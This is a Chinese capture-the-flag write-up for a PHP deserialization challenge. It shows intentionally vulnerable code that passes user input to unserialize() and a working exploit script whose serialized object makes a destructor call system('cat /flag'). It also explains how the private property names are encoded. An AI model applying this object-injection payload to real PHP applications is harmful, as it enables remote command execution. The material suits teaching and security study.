# 垫刀之路06：pop base mini moe

## 题目简述

入口把用户控制的 `data` 直接交给 `unserialize()`。`A::__destruct()` 会把私有属性 `$a` 当作可调用对象，并以私有属性 `$evil` 为参数调用；因此只要控制这两个属性，就能在对象销毁时执行系统命令。题目原本还准备了 `B::__invoke()` 作为中间 gadget，但源码中的 callable string 使它可以被直接绕过。

## 解题过程

服务端关键逻辑为：

```php
class A {
    private $evil;
    private $a;

    function __destruct() {
        $s = $this->a;
        $s($this->evil);
    }
}

class B {
    private $b;

    function __invoke($c) {
        $s = $this->b;
        $s($c);
    }
}

unserialize($_GET['data']);
```

预期链可以令 `A::$a` 指向 `B`，再令 `B::$b = "system"`；调用对象 `B` 时触发 `__invoke()`。但 PHP 也允许把函数名字符串直接作为 callable，因此最短链只需令 `A::$a = "system"`、`A::$evil = "cat /flag"`：

```php
<?php
class A {
    private $evil = "cat /flag";
    private $a = "system";
}

echo urlencode(serialize(new A()));
```

在本地声明同名类后调用 `serialize()`，PHP 会自动把私有属性名编码成包含 NUL 字节的 `\0A\0evil`、`\0A\0a`。这些字节不能原样放入 URL，所以使用 `urlencode()`。将输出作为 `data` 参数提交；请求结束后对象析构，等价于执行：

```php
system("cat /flag");
```

## 方法总结

审计 PHP 反序列化时，应先从自动触发的 `__destruct()`、`__wakeup()` 等方法向下追踪，再检查每个动态调用点接受的是“对象 gadget”还是任意 callable。本题的预期 `A → B::__invoke()` 链并非必要，因为字符串 `system` 本身已经可调用。私有/受保护属性中的 NUL 字节必须经过 URL 编码，否则序列化串会在传输层损坏。
